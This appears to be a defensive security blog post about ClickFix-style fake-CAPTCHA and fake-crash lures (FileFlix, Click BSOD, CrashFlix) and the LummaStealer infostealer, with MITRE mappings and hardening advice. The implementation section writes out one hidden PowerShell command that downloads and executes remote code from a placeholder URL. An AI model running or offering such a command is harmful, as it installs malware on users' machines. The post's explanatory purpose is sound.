+++
date = "2026-01-20"
title = "ClickFlix to CrashFlix"
+++

The ever changing landscape of cyber security has shown us a change in tactics and techniques when it comes to social engineering. In early 2025, security researchers observed a rise in Clickflix campaigns - a technique that leverages the use of fake verification prompts and error messages to trick users into executing commands.


#### Implementation:

`User redirected to malicious website -> Fake CAPTCHA pop-up that asks users to follow the instructions to verify themselves -> Malicious command is pasted by user into the Windows Run Dialog box -> Code is executed`

*User instructions:* 

1. Ctrl + R - opens the Windows Run Dialog Box
2. Ctrl + V - pastes the malicious command that was saved to the user's clipboard via the ClipboardAPI
3. Press enter

e.g `powershell -WindowStyle Hidden -ExecutionPolicy Bypass -Command "IEX (Invoke-WebRequest '<URL>')"`

##### MITRE overview:

1. Phishing (T1566)
2. Clipboard manipulation (T1115)
3. Event triggered execution ( T1546)
4. PowerShell execution (T1059.001)
5. Payload download


##### LummaStealer

LummaStealer (LummaC2) an information stealing malware sold as a malware-as-a-service (MaaS) contributed to the rise of the ClickFlix campaign by using it to deliver the infostealer malware on the devices of victims. Designed to harvest credentials from Chromium based browsers it is typically distributed through phishing emails and communicates with a C2 channel to exfiltrate stolen data.

On May 21, 2025 Microsoft announced the takedown of 2,300 malicious domains that were used as part of the Lumma Stealer infrastructure leading to a noticeable drop in ClickFlix style lures.

##### FileFlix:

Similar to the ClickFlix technique, this technique lures the user into following instructions and clicking on a button to start "a webpage verification process", this opens the default file manager on either Windows (File Explorer) or macOS (Finder). The victim is then instructed to paste a file path into the address bar where a PowerShell command is instead copied to the clipboard and executed once the user clicks Enter.


##### Click BSOD:

This technique displays an animation mimicking the Windows Blue Screen of Death (BSOD) with 'recovery instructions' for the user to follow. Once followed a malicious PowerShell command is silently copied to the clipboard and executed.


##### CrashFlix:

This ClickFlix variant intentionally crashes the browser and presents a fake alert that instructs the user to type in a series of Windows Shortcuts, which copies the malicious code and executes it. Interestingly enough the pop-up implements anti-analysis techniques and prevents users from inspecting the page by blocking keyboard shortcuts for DevTools.

##### Lessons Learned:

1. Limit user permissions (disable PowerShell for users that don't need it)
2. Enable PowerShell logging
3. Implement Windows Defender Application Control (WDAC)


Sources:

[1] hxxps[:]//www.proofpoint.com/us/blog/threat-insight/security-brief-clickfix-social-engineering-technique-floods-threat-landscape

[2] hxxps://www.huntress.com/blog/dont-sweat-clickfix-techniques

[3] hxxps://www.microsoft.com/en-us/security/blog/2025/05/21/lumma-stealer-breaking-down-the-delivery-techniques-and-capabilities-of-a-prolific-infostealer/

[4] hxxps://cybersecuritynews.com/new-clickfix-attack-uses-fake-windows-bsod-screens/

[5] hxxps://www.huntress.com/blog/malicious-browser-extention-crashfix-kongtuke

[6] hxxps://devblogs.microsoft.com/powershell/powershell-constrained-language-mode/



